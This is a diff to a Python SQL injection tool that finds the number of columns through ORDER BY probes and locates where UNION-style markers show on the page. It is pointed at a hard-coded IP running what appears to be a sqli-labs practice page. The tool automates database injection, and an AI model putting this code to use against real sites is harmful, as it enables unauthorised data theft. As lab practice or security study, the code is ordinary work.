@@ -3,10 +3,12 @@
 # time: 2020年 06月 10日 星期三 17:02:23 CST 
 
 import sys
+sys.path.append('/home/nsfoxer/temp/sqlscan/')
 from lib.core.function.get_info import *
 from lib.core.function.payload import *
 from lib.database.data_storage import *
 import random
+from pudb import set_trace
 
 class Injection():
     '''
@@ -21,12 +23,13 @@ class Injection():
     _magic_str = '' # 魔力字符串
     _url_ready = '' # 预处理url
 
-    def __init__(self, url):
+    def __init__(self, url, pre_payload=''):
         self._magic_str = "$$$$$$$$$$$$$$$$$"
-        self.database = Data(F"{url}.sqlite")
+        _url = url.split('//')[1].split('/')[0]
+        self.database = Data(F"{_url}.sqlite")
         self.url = url
         self.page_info = PageInfo(url)
-        self.payload = Payload()
+        self.payload = Payload(pre_payload)
 
     def _get_columns_num(self):
         '''
@@ -35,16 +38,19 @@ class Injection():
         low = 0
         high = 64
         probe_num = 0
-        while low < high:
-            probe_num = (low+high)/2
+        serial_num = 0
+        while low < high-1:
+            probe_num = (low+high)//2
             payload = self.payload.order_by(probe_num)
             url_malformation = self._url_ready.replace(self._magic_str, payload)
-            serial_num = self.page_info.init_malinfo_location(url_malformation, ['You have an error in your SQL syntax;'])
+            serial_num = self.page_info.init_malinfo_location(url_malformation, ['Unknown column '])
             if serial_num > -1:
-                # 表示列存在
-                low = probe_num+1
-            else: # 表示测试列超出范围
-                high = probe_num-1
+                # 表示不列存在
+                high = probe_num
+            else: # 表示列存在
+                low = probe_num
+        if serial_num > -1:
+            probe_num -= 1
         self._probe_num = probe_num
 
 
@@ -65,7 +71,9 @@ class Injection():
             null
         '''
         # url 预处理
-        self._url_ready = self.url.split('=')[:location] + self._magic_str + '&' + self.url.split('&')[1:]
+        self._url_ready = ''.join(self.url.split('&')[:location])+' ' + self._magic_str
+        if location < len(self.url.split('&')):
+            self._url_ready =  self._url_ready + '&' + ''.join(self.url.split('&')[1:])
         # 探测当前表名的列数
         self._get_columns_num()
         # 探测页面信息暴露点,序号
@@ -160,17 +168,18 @@ class Injection():
         i = 0
         while i < self._probe_num:
             randnum_list.append(str(random.randint(100000, 1000000)))
+            i += 1
         # 根据随机字符获取payload
         payload = self.payload.order_list(randnum_list)
         url_malformation = self._url_ready.replace(self._magic_str, payload)
         serial_num = self.page_info.init_malinfo_location(url_malformation, randnum_list)
         if serial_num < 0:
             print("未能探测成功")
-        self._serial_num = serial_num
+        self._serial_num = serial_num + 1
 
 
 if __name__ == '__main__':
-    inject = Injection('http://47.95.4.158:8002/Less-1/?id=1')
+    inject = Injection('http://47.95.4.158:8002/Less-1/?id=1', '\'')
     inject.exec_payload(1, 1)
 
 
